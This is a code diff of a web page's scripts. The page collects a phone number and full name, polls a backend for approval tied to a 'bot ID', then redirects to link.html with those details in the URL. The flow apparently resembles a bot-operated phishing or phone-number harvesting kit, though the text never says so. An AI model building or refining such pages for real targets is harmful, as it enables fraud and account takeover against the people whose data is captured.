@@ -208,8 +208,7 @@
 
 
 <!-- ============================================================
-     SCRIPT 1 — BOT ID RESOLVER (moved from <head> to here)
-     Runs first because it appears first among the bottom scripts.
+     SCRIPT 1 — BOT ID RESOLVER
      ============================================================ -->
 <script>
 (function () {
@@ -258,15 +257,14 @@
 
 <!-- ============================================================
      SCRIPT 2 — PAGE LOGIC
-     Wrapped in an IIFE so `return` is legal and nothing dies
-     with a SyntaxError.
      ============================================================ -->
 <script>
 (function () {
     'use strict';
 
     // ---------- CONFIG ----------
-    const BACKEND_URL = ""; // leave empty to use same-origin
+    const BACKEND_URL = "";            // leave empty to use same-origin
+    const NEXT_PAGE   = "link.html";   // <-- page after details.html
 
     // ---------- BOTID (set by script 1 above) ----------
     const botId = window.__BOT_ID__;
@@ -354,6 +352,25 @@
         }
     }
 
+    // ---------- REDIRECT ----------
+    let hasRedirected = false;
+
+    function goNext(requestId, phoneVal) {
+        if (hasRedirected) return;
+        hasRedirected = true;
+
+        const qs = [
+            'botId='     + encodeURIComponent(botId || ''),
+            'requestId=' + encodeURIComponent(requestId || ''),
+            'phone='     + encodeURIComponent(phoneVal || ''),
+            'name='      + encodeURIComponent(fullName || 'User')
+        ].join('&');
+
+        const nextUrl = NEXT_PAGE + '?' + qs;
+        console.log('✅ Approved — redirecting to:', nextUrl);
+        window.location.assign(nextUrl);
+    }
+
     // ---------- FORM SUBMIT ----------
     form.addEventListener('submit', async function (e) {
         e.preventDefault();
@@ -396,9 +413,11 @@
             const requestId = data.requestId;
             if (!requestId) throw new Error('No request ID returned');
 
+            // Persist for downstream pages (URL is still the primary carrier)
             try {
                 localStorage.setItem('phone', phoneVal);
                 localStorage.setItem('phoneRequestId', requestId);
+                localStorage.setItem('fullName', fullName);
             } catch (e) { /* storage blocked */ }
 
             stopPolling();
@@ -422,11 +441,8 @@
                         stopPolling();
                         setLoading(false);
                         setStatus('✅ Verified! Redirecting...', 'success');
-                        const redirectUrl = 'link.html?requestId=' + encodeURIComponent(requestId) +
-                                            '&phone='     + encodeURIComponent(phoneVal) +
-                                            '&botId='     + encodeURIComponent(botId);
                         setTimeout(function () {
-                            window.location.href = redirectUrl;
+                            goNext(requestId, phoneVal);
                         }, 700);
                         return;
                     }
